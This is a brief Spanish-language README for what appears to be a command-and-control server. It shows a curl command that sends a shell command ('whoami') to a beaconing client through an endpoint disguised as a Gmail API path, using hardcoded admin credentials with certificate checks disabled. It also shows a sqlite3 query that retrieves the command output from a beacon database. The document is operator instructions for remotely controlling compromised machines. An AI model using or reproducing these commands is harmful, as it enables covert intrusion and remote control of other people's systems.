# README

## enviar comando
curl -k -u admin:Pass123 https://<IP>:443/gmail/v1/users/ \
  -d "client_id=<CLIENT_ID>&command=whoami"

## Ver resultado
sqlite3 sessions/beacon.db "SELECT output FROM results WHERE client_id='<CLIENT_ID>' ORDER BY ts DESC LIMIT 1;"
